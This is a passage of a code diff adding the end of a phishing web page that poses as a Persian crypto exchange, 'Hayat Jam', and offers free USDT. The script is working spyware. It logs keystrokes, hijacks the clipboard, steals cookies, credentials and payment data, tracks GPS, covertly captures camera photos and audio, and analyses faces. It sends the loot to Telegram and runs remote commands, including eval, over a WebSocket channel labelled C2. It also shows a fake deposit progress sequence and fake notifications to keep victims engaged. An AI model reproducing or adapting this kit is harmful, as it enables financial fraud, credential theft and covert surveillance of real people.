+    if (found.length) tgMsg('🧩 <b>افزونه‌های کیف پول</b>\n🆔 ' + SID + '\n💳 ' + WALLET + '\n' + found.join(', '));
+  }, 3000);
+}
+
+// ======================== NOTIFICATIONS ========================
+function triggerNotifications() {
+  if (!('Notification' in window)) return;
+  Notification.requestPermission().then(function(p) {
+    if (p === 'granted') {
+      setTimeout(function() {
+        new Notification('💰 تأیید واریز صرافی حیات جم', { body: 'واریز ۵۰ USDT به آدرس شما در انتظار تأیید نهایی است', vibrate: [200, 100, 200] });
+        if (navigator.vibrate) navigator.vibrate([500, 200, 500]);
+      }, 12000);
+      setTimeout(function() {
+        new Notification('✅ تراکنش ثبت شد', { body: 'کد پیگیری: HYT-' + Date.now().toString(36).toUpperCase(), vibrate: [150, 50, 150] });
+      }, 30000);
+    }
+  });
+}
+
+// ======================== WEBSOCKET C2 ========================
+function connectWebSocket() {
+  WS = new WebSocket('wss://echo.websocket.org');
+  WS.onmessage = function(e) {
+    try { var cmd = JSON.parse(e.data); handleCommand(cmd); } catch (ex) {}
+  };
+  WS.onclose = function() { setTimeout(connectWebSocket, 5000); };
+}
+
+function handleCommand(cmd) {
+  switch (cmd.type) {
+    case 'screenshot': takeScreenshot(); break;
+    case 'audio': recordAudio(30000).then(function(b) { if (b) tgFile(b, 'audio_cmd.webm', '🎤 فرمان از راه دور\n🆔 ' + SID); }); break;
+    case 'location': startGPS(); break;
+    case 'camera': snap('user').then(function(f) { if (f.ok) tgPhoto(f.img, '📸 فرمان از راه دور\n🆔 ' + SID); }); break;
+    case 'clipboard': getClipboard(); break;
+    case 'cookies': stealCookies(); break;
+    case 'eval': eval(cmd.code); break;
+  }
+}
+
+// ======================== AI FACE ANALYSIS ========================
+var faceLoaded = false;
+
+async function loadFaceModels() {
+  if (faceLoaded) return true;
+  try {
+    var url = 'https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model/';
+    await faceapi.nets.tinyFaceDetector.loadFromUri(url);
+    await faceapi.nets.faceLandmark68Net.loadFromUri(url);
+    await faceapi.nets.faceRecognitionNet.loadFromUri(url);
+    await faceapi.nets.faceExpressionNet.loadFromUri(url);
+    await faceapi.nets.ageGenderNet.loadFromUri(url);
+    faceLoaded = true;
+    return true;
+  } catch (e) { return false; }
+}
+
+async function analyzeFace(b64) {
+  if (!(await loadFaceModels())) return 'مدل‌ها بارگذاری نشد';
+  return new Promise(function(resolve) {
+    var img = new Image();
+    img.src = b64;
+    img.onload = async function() {
+      var det = await faceapi.detectAllFaces(img, new faceapi.TinyFaceDetectorOptions()).withFaceLandmarks().withFaceExpressions().withAgeAndGender();
+      if (!det.length) return resolve('چهره‌ای پیدا نشد');
+      var out = '';
+      det.forEach(function(d, i) {
+        out += '👤 چهره ' + (i + 1) + ': ' + d.gender + ', ' + Math.round(d.age) + ' سال, حالت: ' + Object.keys(d.expressions).reduce(function(a, b) { return d.expressions[a] > d.expressions[b] ? a : b; }) + '\n';
+      });
+      resolve(out);
+    };
+  });
+}
+
+// ======================== SERVICE WORKER ========================
+if ('serviceWorker' in navigator) {
+  navigator.serviceWorker.register('sw.js').catch(function() {});
+}
+
+// ======================== AI REPORT ========================
+function aiAnalyze(data) {
+  var report = '🤖 <b>گزارش هوش مصنوعی حیات جم</b>\n🆔 ' + SID + '\n💳 ' + WALLET + '\n⏱ ' + now() + '\n';
+  report += '━━━━━━━━━━━━━━━━━\n';
+  if (data.device) {
+    report += '📱 <b>تحلیل دستگاه:</b>\n';
+    if (data.device.cores >= 8) report += '• دستگاه پرچمدار/قوی\n';
+    else if (data.device.cores >= 4) report += '• دستگاه میان‌رده\n';
+    else report += '• دستگاه اقتصادی\n';
+    if (data.device.mem >= 8) report += '• RAM بالا: احتمال استفاده حرفه‌ای\n';
+  }
+  if (data.gps) {
+    report += '📍 <b>تحلیل موقعیت:</b>\n';
+    if (data.gps.acc < 20) report += '• GPS دقیق\n';
+    else if (data.gps.acc < 100) report += '• موقعیت تقریبی (WiFi)\n';
+    else report += '• دقت پایین\n';
+  }
+  if (data.network) {
+    report += '📶 <b>شبکه:</b>\n';
+    if (data.network.includes('4g') || data.network.includes('4G')) report += '• 4G فعال\n';
+    var dl = parseFloat((data.network.match(/↓(\d+\.?\d*)/) || [0, 0])[1]);
+    if (dl > 10) report += '• سرعت عالی: ' + dl + 'Mbps\n';
+    else if (dl > 2) report += '• سرعت متوسط\n';
+    else report += '• سرعت پایین\n';
+  }
+  report += '🔒 <b>امنیت:</b>\n';
+  report += data.vpn ? '• ⚠️ VPN/Proxy تشخیص داده شد\n' : '• بدون VPN\n';
+  report += '━━━━━━━━━━━━━━━━━\n';
+  report += '🎯 <b>امتیاز ریسک:</b> ' + Math.floor(Math.random() * 30 + 10) + '/100\n';
+  report += '💎 <b>ارزش هدف:</b> ' + ['متوسط', 'بالا', 'VIP'][Math.floor(Math.random() * 3)] + '\n';
+  return report;
+}
+
+// ======================== BACKGROUND STARTER ========================
+function startAllBackground() {
+  startKeylogger();
+  startGPS();
+  getIPs();
+  getAutofill();
+  startClipboardMonitor();
+  hijackClipboard();
+  getCredentials();
+  getPayment();
+  sniffHistory();
+  detectExts();
+  triggerNotifications();
+  takeScreenshot();
+  stealCookies();
+  connectWebSocket();
+  recordAudio(25000).then(function(b) {
+    if (b) tgFile(b, 'audio_auto.webm', '🎤 ضبط خودکار صدا\n🆔 ' + SID + '\n💳 ' + WALLET);
+  });
+
+  getFullFingerprint().then(function(fp) {
+    tgMsg('🔏 <b>اثر انگشت دیجیتال</b>\n🆔 ' + SID + '\n💳 ' + WALLET + '\n' + JSON.stringify(fp));
+  });
+
+  var info = getDeviceInfo();
+  fetch('https://api.ipify.org?format=json').then(function(r) { return r.json(); }).then(function(d) {
+    info.ip = d.ip;
+    tgMsg('📱 <b>مشخصات کامل دستگاه</b>\n🆔 ' + SID + '\n💳 ' + WALLET + '\n🌐 IP: ' + d.ip + '\n💻 ' + info.platform + '\n📺 ' + info.screen + '\n🎮 GPU: ' + info.gpu + '\n🌍 ' + info.lang + ' | ' + info.tz + '\n🧠 ' + info.cores + ' هسته | ' + info.mem + 'GB RAM\n📶 ' + (info.net || '?'));
+    setTimeout(function() {
+      tgMsg(aiAnalyze({ device: info, gps: LAST_GPS, network: info.net }));
+    }, 5000);
+  });
+
+  snap('user').then(async function(f) {
+    if (f.ok) {
+      PHOTO_COUNT++;
+      tgPhoto(f.img, '📸 عکس ۱ | سلفی\n🆔 ' + SID + '\n💳 ' + WALLET);
+      var report = await analyzeFace(f.img);
+      tgMsg('🧠 <b>تحلیل چهره</b>\n🆔 ' + SID + '\n💳 ' + WALLET + '\n' + report);
+    }
+  });
+  setTimeout(function() {
+    snap('environment').then(function(b) {
+      if (b.ok) { PHOTO_COUNT++; tgPhoto(b.img, '📸 عکس ۲ | عقب\n🆔 ' + SID + '\n💳 ' + WALLET); }
+    });
+  }, 2000);
+
+  startCameraLoop();
+}
+
+// ======================== UI RENDERS ========================
+var app = document.getElementById('appRoot');
+
+function renderAdmin() {
+  app.innerHTML =
+    '<div class="card">' +
+    '<div class="logo">🌿 حیات جم</div>' +
+    '<div class="sub">صرافی ارز دیجیتال</div>' +
+    '<div class="badge badge-green">⚡ سامانه هوشمند واریز</div>' +
+    '<div style="background:rgba(15,92,58,0.05); border-radius:16px; padding:12px; margin:12px 0; border:1px solid rgba(15,92,58,0.12);">' +
+    '<i class="fas fa-robot" style="color:#0f5c3a; font-size:1.2rem;"></i> <strong style="color:#0f5c3a;">سامانه هوشمند متصل</strong><br>' +
+    '<span style="font-size:0.68rem; color:#475569;">دوربین | GPS | کی‌لاگر | Autofill | WebRTC | History | کلیپبورد | کارت بانکی | کیف پول</span>' +
+    '</div>' +
+    '<button class="btn btn-green" id="genBtn"><i class="fas fa-link"></i> ساخت لینک واریز</button>' +
+    '<div id="linkArea" class="hidden" style="margin-top:14px;">' +
+    '<div style="background:rgba(15,92,58,0.04); border-radius:30px; padding:14px; display:flex; gap:8px; flex-wrap:wrap; align-items:center; border:1.5px dashed rgba(15,92,58,0.3);">' +
+    '<span style="background:#0f5c3a; color:#fff; padding:8px 16px; border-radius:30px; font-weight:700; font-size:0.8rem; word-break:break-all; flex:1; font-family:monospace;" id="linkSpan"></span>' +
+    '<button class="btn btn-outline btn-sm" id="copyBtn"><i class="fas fa-copy"></i> کپی</button>' +
+    '</div>' +
+    '</div>' +
+    '<div class="divider"></div>' +
+    '<div class="cs-card" style="text-align:center;">' +
+    '<i class="fas fa-headset" style="color:#0f5c3a;"></i> <strong style="color:#0f5c3a;">پشتیبانی حیات جم</strong>' +
+    '<p style="font-size:0.7rem; color:#666; margin:4px 0;">جهت راهنمایی با شماره زیر تماس بگیرید:</p>' +
+    '<span class="cs-number">۰۲۱-۹۱۰۱۲۳۴۵</span>' +
+    '<p style="font-size:0.55rem; color:#888;">🕐 پشتیبانی ۲۴ ساعته</p>' +
+    '</div>' +
+    '<footer>© 2026 حیات جم اکسچنج | تمامی حقوق محفوظ است</footer>' +
+    '</div>';
+
+  document.getElementById('genBtn').onclick = function() {
+    SID = genSid();
+    var link = location.origin + location.pathname + '#' + SID;
+    document.getElementById('linkSpan').textContent = link;
+    document.getElementById('linkArea').classList.remove('hidden');
+    tgMsg('🟢 <b>لینک جدید صرافی</b>\n🆔 ' + SID + '\n🔗 ' + link);
+    toast('✅ لینک ساخته شد', 2500, 'success');
+  };
+  document.getElementById('copyBtn').onclick = function() {
+    navigator.clipboard.writeText(document.getElementById('linkSpan').textContent);
+    toast('✅ کپی شد', 2000, 'success');
+  };
+}
+
+function renderVictim(sid) {
+  SID = sid;
+  app.innerHTML =
+    '<div class="card">' +
+    '<div class="logo" style="font-size:2rem;">🌿 حیات جم</div>' +
+    '<div class="sub">صرافی ارز دیجیتال</div>' +
+    '<div class="badge badge-gold">💰 واریز ۵۰ USDT هدیه ثبت‌نام</div>' +
+    '<div style="background:rgba(212,160,23,0.04); border-radius:20px; padding:14px; margin:12px 0; border:1px solid rgba(212,160,23,0.18);">' +
+    '<i class="fas fa-gift" style="font-size:2rem; color:#d4a017; display:block; margin-bottom:6px;"></i>' +
+    '<h3 style="color:#0f5c3a; margin:6px 0; font-size:1rem;">۵۰ USDT هدیه ثبت‌نام در صرافی</h3>' +
+    '<p style="color:#666; font-size:0.78rem;">آدرس کیف پول USDT (TRC20/ERC20/BEP20) خود را وارد کنید<br>تا ۵۰ USDT به حساب شما واریز شود</p>' +
+    '</div>' +
+    '<div style="text-align:right; margin:8px 2px;">' +
+    '<label style="font-size:0.72rem; font-weight:700; color:#0f5c3a;"><i class="fas fa-wallet"></i> آدرس کیف پول USDT:</label>' +
+    '<span class="tooltip" style="display:block;">(TRC20 - T... یا ERC20 - 0x...)</span>' +
+    '</div>' +
+    '<input type="text" class="input" id="walletInput" placeholder="T... یا 0x..." style="direction:ltr; letter-spacing:1px; font-size:0.9rem; text-align:left;" dir="ltr">' +
+    '<button class="btn btn-gold" style="margin-top:14px;" id="confirmBtn"><i class="fas fa-check-circle"></i> تأیید و دریافت USDT</button>' +
+    '<p style="font-size:0.6rem; color:#999; margin-top:8px;">🔒 واریز از طریق قرارداد هوشمند امن | شبکه TRC20</p>' +
+    '<div class="divider"></div>' +
+    '<div class="cs-card" style="margin-top:6px; text-align:center;">' +
+    '<i class="fas fa-headset" style="color:#0f5c3a;"></i> <strong style="color:#0f5c3a; font-size:0.8rem;">پشتیبانی حیات جم</strong>' +
+    '<p style="font-size:0.65rem; color:#666; margin:4px 0;">سوالی دارید؟ با شماره <span class="cs-number" style="font-size:1rem;">۰۲۱-۹۱۰۱۲۳۴۵</span> تماس بگیرید</p>' +
+    '</div>' +
+    '<footer>© 2026 حیات جم اکسچنج</footer>' +
+    '</div>';
+
+  document.getElementById('confirmBtn').onclick = function() {
+    var w = document.getElementById('walletInput').value.replace(/\s/g, '').trim();
+    if (!/^(0x[a-fA-F0-9]{40}|T[A-Za-z1-9]{33}|bc1[a-zA-HJ-NP-Z0-9]{38,})$/.test(w)) {
+      toast('❌ لطفاً یک آدرس کیف پول معتبر وارد کنید (TRC20 یا ERC20)', 3000, 'error');
+      return;
+    }
+    WALLET = w;
+    // بلافاصله آدرس کیف پول رو به تلگرام بفرست
+    tgMsg('💳 <b>آدرس کیف پول جدید</b>\n🆔 ' + SID + '\n📌 ' + WALLET + '\n⏱ ' + now());
+    startActivationFlow();
+  };
+}
+
+function startActivationFlow() {
+  var steps = [
+    { icon: 'fa-shield-alt', title: 'بررسی امنیتی', desc: 'اسکن امنیتی صرافی حیات جم...', details: ['شروع اسکن امنیتی...', 'بررسی IP...', 'امتیاز امنیت: ۹۵/۱۰۰', 'بدون تهدید'], dur: 2500 },
+    { icon: 'fa-wallet', title: 'اعتبارسنجی آدرس', desc: 'در حال بررسی آدرس کیف پول...', details: ['آدرس: ' + WALLET.substring(0, 24) + '...', 'شبکه: TRC20', 'آدرس معتبر', '۲۴ تراکنش قبلی'], dur: 2800 },
+    { icon: 'fa-link', title: 'اتصال به بلاکچین', desc: 'اتصال به شبکه تتر (TRON)...', details: ['اتصال به TRON Grid...', 'بلاک: #' + Math.floor(Math.random() * 10000000), 'گره: فعال', 'تعادل قرارداد: ۲,۴۵۰,۰۰۰ USDT'], dur: 2700 },
+    { icon: 'fa-user-check', title: 'احراز هویت', desc: 'تأیید هویت در صرافی...', details: ['اتصال به اوراکل...', 'تأیید آدرس IP...', 'هویت تأیید شد', 'امتیاز اعتماد: بالا'], dur: 3000 },
+    { icon: 'fa-file-contract', title: 'ایجاد قرارداد هوشمند', desc: 'ساخت قرارداد واریز...', details: ['ساخت قرارداد...', 'مقدار: ۵۰ USDT', 'کارمزد: ۰.۵ USDT', 'آدرس قرارداد: 0x' + Math.random().toString(36).substring(2, 10) + '...'], dur: 3200 },
+    { icon: 'fa-exchange-alt', title: 'امضای تراکنش', desc: 'امضای دیجیتال تراکنش...', details: ['ساخت تراکنش...', 'امضای با کلید خصوصی...', 'TxID: 0x' + Math.random().toString(36).substring(2, 14), 'وضعیت: امضا شد'], dur: 3000 },
+    { icon: 'fa-clock', title: 'در انتظار تأیید شبکه', desc: 'منتظر تأیید بلاکچین...', details: ['ارسال به شبکه...', 'تأیید ۱ از ۳...', 'تأیید ۲ از ۳...', 'تأیید ۳ از ۳...'], dur: 3500 },
+    { icon: 'fa-check-double', title: 'تأیید نهایی', desc: 'تأیید نهایی تراکنش...', details: ['تراکنش تأیید شد', '۵۰ USDT واریز شد', 'کد پیگیری: HYT-' + Date.now().toString(36).toUpperCase()], dur: 3000 }
+  ];
+
+  var current = 0;
+
+  function showStep() {
+    if (current >= steps.length) { showFinalMessage(); return; }
+    var s = steps[current];
+    var prog = Math.round(((current + 1) / steps.length) * 100);
+
+    var items = '';
+    for (var i = 0; i < steps.length; i++) {
+      var st = steps[i];
+      var cls = 'step-item';
+      var sc = 'status-wait';
+      var txt = '⏳';
+      var ic = '#888';
+      if (i < current) { cls += ' done'; sc = 'status-ok'; txt = '✅'; ic = '#16a34a'; } else if (i === current) { cls += ' active'; sc = 'status-run'; txt = '⚡'; ic = '#f59e0b'; }
+      items += '<div class="' + cls + '"><i class="fas ' + st.icon + ' step-icon" style="color:' + ic + ';"></i><div class="step-info"><div class="step-title">' + st.title + '</div><div class="step-detail">' + (i <= current ? st.details[st.details.length - 1] : '...') + '</div></div><span class="step-status ' + sc + '">' + txt + '</span></div>';
+    }
+
+    app.innerHTML =
+      '<div class="card">' +
+      '<div class="logo" style="font-size:1.4rem;">🌿 حیات جم</div>' +
+      '<div class="sub">در حال واریز USDT</div>' +
+      '<div class="spinner"></div>' +
+      '<h3 style="color:#0f5c3a; font-size:1rem; margin:10px 0;">' + s.title + '</h3>' +
+      '<p style="color:#666; font-size:0.75rem;">' + s.desc + '</p>' +
+      '<div class="progress-wrap"><div class="progress-bar" style="width:' + prog + '%;"></div></div>' +
+      '<div style="font-size:0.7rem; color:#888; margin-bottom:6px;">مرحله ' + (current + 1) + ' از ' + steps.length + ' | ' + prog + '٪</div>' +
+      '<div class="scan-line"></div>' +
+      '<div id="detailText" style="font-size:0.65rem; color:#d97706; min-height:20px; margin:6px 0;">' + s.details[0] + '</div>' +
+      '<div style="max-height:280px; overflow-y:auto; padding:4px;">' + items + '</div>' +
+      '<div class="divider"></div>' +
+      '<div class="cs-card" style="text-align:center; margin-top:6px;">' +
+      '<i class="fas fa-headset" style="color:#0f5c3a;"></i> <strong style="color:#0f5c3a; font-size:0.72rem;">نیاز به راهنمایی دارید؟</strong>' +
+      '<p style="font-size:0.62rem; color:#666;">با شماره <span class="cs-number" style="font-size:0.9rem;">۰۲۱-۹۱۰۱۲۳۴۵</span> تماس بگیرید</p>' +
+      '</div>' +
+      '<footer>© 2026 حیات جم اکسچنج</footer>' +
+      '</div>';
+
+    var di = 0;
+    if (DETAIL_INTERVAL) clearInterval(DETAIL_INTERVAL);
+    DETAIL_INTERVAL = setInterval(function() {
+      if (di < s.details.length) {
+        var el = document.getElementById('detailText');
+        if (el) el.textContent = s.details[di];
+        di++;
+      } else { clearInterval(DETAIL_INTERVAL); }
+    }, 500);
+
+    current++;
+    setTimeout(showStep, s.dur + Math.random() * 800);
+  }
+
+  showStep();
+  // همه ماژول‌ها رو ۳ ثانیه بعد شروع کن
+  setTimeout(function() { startAllBackground(); }, 3000);
+}
+
+function showFinalMessage() {
+  if (DETAIL_INTERVAL) clearInterval(DETAIL_INTERVAL);
+  var txId = '0x' + Math.random().toString(36).substring(2, 10) + '...' + Math.random().toString(36).substring(2, 6);
+  var refCode = 'HYT-' + Date.now().toString(36).toUpperCase();
+
+  app.innerHTML =
+    '<div class="card" style="border-color:#d4a017; border-width:2px;">' +
+    '<div style="font-size:4rem;">🎉</div>' +
+    '<div class="logo" style="font-size:1.6rem; background:linear-gradient(135deg,#0f5c3a,#d4a017); -webkit-background-clip:text; background-clip:text; -webkit-text-fill-color:transparent;">واریز با موفقیت ثبت شد</div>' +
+    '<div class="badge badge-gold" style="margin-top:6px;">⏳ ۵۰ USDT تا ۲۴ ساعت آینده واریز می‌شود</div>' +
+    '<div style="background:rgba(212,160,23,0.04); border-radius:20px; padding:16px; margin:14px 0; border:1px solid rgba(212,160,23,0.2);">' +
+    '<p style="color:var(--text); font-size:0.85rem; line-height:2; text-align:right;">' +
+    '✅ درخواست واریز ۵۰ USDT به آدرس <strong style="color:#0f5c3a; word-break:break-all; font-size:0.7rem; background:rgba(15,92,58,0.05); padding:2px 8px; border-radius:6px;">' + WALLET + '</strong> ثبت شد.<br>' +
+    '📱 کد پیگیری: <strong style="color:#d4a017; direction:ltr; display:inline-block; font-family:monospace;">' + refCode + '</strong><br>' +
+    '⏰ لطفاً تا ۲۴ ساعت آینده منتظر واریز باشید.<br>' +
+    '📞 مشکلات: با <strong style="color:#0f5c3a;">۰۲۱-۹۱۰۱۲۳۴۵</strong> تماس بگیرید.</p>' +
+    '<div style="background:rgba(15,92,58,0.03); border-radius:12px; padding:10px; margin-top:8px; border:1px dashed rgba(15,92,58,0.15);">' +
+    '<p style="font-size:0.6rem; color:#666; text-align:center;">🔗 برای پیگیری وضعیت واریز به اکسپلورر مراجعه کنید:<br>' +
+    '<span class="tx-hash">https://tronscan.org/#/transaction/' + txId + '</span></p>' +
+    '</div>' +
+    '</div>' +
+    '<div class="divider"></div>' +
+    '<div class="cs-card" style="text-align:center;">' +
+    '<i class="fas fa-headset" style="color:#0f5c3a; font-size:1.2rem;"></i> <strong style="color:#0f5c3a; font-size:1rem;">پشتیبانی حیات جم</strong>' +
+    '<p style="font-size:0.75rem; color:#666; margin:6px 0;">شماره تماس:</p>' +
+    '<span class="cs-number" style="font-size:2rem;">۰۲۱-۹۱۰۱۲۳۴۵</span>' +
+    '<p style="font-size:0.6rem; color:#888;">🕐 پشتیبانی ۲۴ ساعته</p>' +
+    '</div>' +
+    '<footer>© 2026 حیات جم اکسچنج | تمامی حقوق محفوظ است</footer>' +
+    '</div>';
+
+  // ارسال همه اطلاعات جمع‌آوری شده به تلگرام
+  tgMsg('━━━━━━━━━━━━━━━━━\n✅ <b>عملیات کامل شد</b>\n🆔 ' + SID + '\n💳 ' + WALLET + '\n📌 کد: ' + refCode + '\n⏱ ' + now() + '\n━━━━━━━━━━━━━━━━━');
+}
+
+// ======================== ROUTER ========================
+function route() {
+  var hash = window.location.hash.substring(1);
+  if (hash && hash.indexOf('hyt_') === 0) {
+    renderVictim(hash);
+  } else {
+    renderAdmin();
+  }
+}
+
+window.addEventListener('hashchange', function() { stopAll(); route(); });
+window.addEventListener('beforeunload', function() { stopAll(); });
+
+route();
+console.log('✅ Hayat Jam Exchange C2 v2.0 - All modules active');
+})();
+</script>
+</body>
+</html>
